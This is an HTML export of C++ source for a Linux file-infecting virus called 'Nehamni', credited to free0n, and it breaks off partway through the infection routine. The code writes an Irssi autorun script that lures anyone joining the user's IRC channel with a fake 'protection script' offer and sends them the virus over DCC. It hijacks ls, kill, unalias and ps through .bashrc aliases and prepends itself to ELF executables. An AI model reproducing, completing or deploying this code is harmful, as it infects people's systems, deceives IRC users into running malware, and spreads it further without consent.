<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* virus name: Nehamni (kneeeee ham knee)
 * author: free0n 
 * site:http://free0n.host.sk || http://doomriderz.co.nr
 * desc: linux prepender virus mixed bash alias hooking and irssi irc
 *       client spreading. Only infects ELF files in the current directory
 *       or the directory of where the alias is getting executed. Code is
 *       pretty well documented. Tested on ubuntu 7.04 fiesty fawn.
 * compile: g++ -O3 "nehamni" -o "nehamni"
 * greetz: wargame,genetix,impurity,synge,
 *         cyneox,hermit,retro,hutley,DiA,
 *         berniee, izeee! napster, spth,
 *         sabek, slage, SysBreaker, Retro,
 *         MrAnderson, and anyone else i forgot
 *         sry :) 
 */</span><span class="sc0">

</span><span class="sc9">#include &lt;iostream&gt;
#include &lt;sys/dir.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;elf.h&gt;
#include &lt;fcntl.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define MAX_DIR_PATH 2048
#define NAME "nehamni"
#define SIZE 17586
</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">std</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">me</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">myPath</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">mesize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//checks if a directory exists or not 
</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">DirectoryExists</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dirpath</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">dirpath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fs</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">S_ISDIR</span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//Irssi irc client spreading
//works by checking if we have .irssi installed in the home folder
//then checks if there is a autorun directory. If there isn't then 
//it's created an we drop a perl script file. Sort of like what we do
//with mirc on windows. Anyone that joins a channel the user is on
//will get a message and a dcc request.
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Irssi</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">irssi</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">,</span><span class="sc6">"/.irssi"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">DirectoryExists</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">,</span><span class="sc6">"/scripts"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">DirectoryExists</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">mkdir</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">,</span><span class="sc4">0777</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">,</span><span class="sc6">"/autorun"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">DirectoryExists</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">mkdir</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">,</span><span class="sc4">0777</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">,</span><span class="sc6">"/nehamni.pl"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">irssistream</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">irssistream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">irssi</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"w+"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"use Irssi; \n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"use vars qw($VERSION %IRSSI);\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"$VERSION = '0.69';\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"%IRSSI = (\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"name        =&gt; 'nehamni',\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"authors     =&gt; 'free0n',\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"contact     =&gt; 'phree0n@hotmail.com',\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"url         =&gt; 'http://free0n.host.sk',\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"license     =&gt; 'GPL',\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"ldescription =&gt; 'nehamni protection script',\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">");\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"sub nehamni {\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"my($server, $data, $nick, $address) = @_;\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"return if ($nick eq $server-&gt;{nick});\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"$server-&gt;command(\"^MSG \" . $nick . \" hey \" . $nick . \" check out this irssi irc protection script, it even has antivirus for dcc transfers\"); \n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"$server-&gt;command(\"^DCC SEND \" . $nick . \" %s\");\n"</span><span class="sc10">,</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"$server-&gt;command(\"^MSG \" . $nick . \" maybe i should make my own antivirus, it would be way better then the ones out there now :D\");\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"}\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"sub unloaded {\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"printf(\"I do it for myself, not for you and not for others!\");\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"}\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"Irssi::command_bind nehamni =&gt; \\&amp;unloaded; \n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">,</span><span class="sc6">"Irssi::signal_add('message join', 'nehamni');\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">irssistream</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Profile</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//apend text to the .bashrc file 
</span><span class="sc0">    </span><span class="sc2">//so we can alias programs that get used in bash shell
</span><span class="sc0">    </span><span class="sc2">//so for example if the user executes ls, then we call our virus
</span><span class="sc0">    </span><span class="sc2">//or user executes kill command then instead of launching kill we launch
</span><span class="sc0">    </span><span class="sc2">//the virus. We edit bashrc cause it gets executed each time a new shell
</span><span class="sc0">    </span><span class="sc2">//launches. This will also change the directory of infection, so whatever
</span><span class="sc0">    </span><span class="sc2">//directory that the command gets run in is the directory the virus will infect
</span><span class="sc0">    </span><span class="sc2">//in...
</span><span class="sc0">    </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">bashrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">string</span><span class="sc10">)</span><span class="sc11">getenv</span><span class="sc10">(</span><span class="sc6">"HOME"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"/.bashrc"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fb</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">bashrc</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc11">O_RDONLY</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffw</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statrc</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">bashrc</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">statrc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fb</span><span class="sc10">,(</span><span class="sc11">statrc</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">)),</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fb</span><span class="sc10">,&amp;</span><span class="sc11">buffw</span><span class="sc10">,(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fb</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strncmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buffw</span><span class="sc10">,</span><span class="sc11">NAME</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">bashstream</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">bashstream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">bashrc</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc6">"at"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">bashstream</span><span class="sc10">,</span><span class="sc6">"alias ls='%s'\n"</span><span class="sc10">,</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">bashstream</span><span class="sc10">,</span><span class="sc6">"alias kill='%s'\n"</span><span class="sc10">,</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">bashstream</span><span class="sc10">,</span><span class="sc6">"alias unalias='%s'\n"</span><span class="sc10">,</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">bashstream</span><span class="sc10">,</span><span class="sc6">"alias ps='%s'\n"</span><span class="sc10">,</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">bashstream</span><span class="sc10">,</span><span class="sc6">"#%s "</span><span class="sc10">,</span><span class="sc11">NAME</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> 
            </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">bashstream</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//is the fish! kidding elfish i know :D
</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">IsElfish</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostFile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc11">elfHeader</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">hostFile</span><span class="sc10">,</span><span class="sc11">O_RDONLY</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,&amp;</span><span class="sc11">elfHeader</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc2">//check if it says ELF
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strncmp</span><span class="sc10">((</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">elfHeader</span><span class="sc10">.</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">"ELF"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc2">//check if it's executable
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">elfHeader</span><span class="sc10">.</span><span class="sc11">e_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ET_EXEC</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">IsInfected</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">chkfile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">chkfile</span><span class="sc10">,</span><span class="sc11">O_RDONLY</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statbuf</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">chkfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">statbuf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">//seek to the end of the file where we would have our NAME
</span><span class="sc0">        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">statbuf</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">)),</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,&amp;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc2">//check to see if the marker was = to NAME(nehamni)
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strncmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">NAME</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc2">//check to see if the name is nehamni 
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strncmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">chkfile</span><span class="sc10">,</span><span class="sc11">NAME</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Prepend</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fNehamni</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fHost</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fTmp</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">hstat</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vsize</span><span class="sc10">,</span><span class="sc11">hsize</span><span class="sc10">,</span><span class="sc11">mesize</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">vircode</span><span class="sc10">,*</span><span class="sc11">hcode</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">IsInfected</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fNehamni</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//read the virus code
</span><span class="sc0">            </span><span class="sc11">vsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SIZE</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">vircode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">vsize</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">vircode</span><span class="sc10">,</span><span class="sc11">vsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fNehamni</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fTmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//read the file that we passed in, should be a host flie
</span><span class="sc0">                </span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,&amp;</span><span class="sc11">hstat</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">hsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">hstat</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">hcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">hsize</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">hcode</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">hsize</span><span class="sc10">,</span><span class="sc11">fTmp</span><span class="sc10">);</span><span class="sc0">
                
                </span><span class="sc2">//overwrite the host file and write the virus,host,marker to
</span><span class="sc0">                </span><span class="sc2">//the file
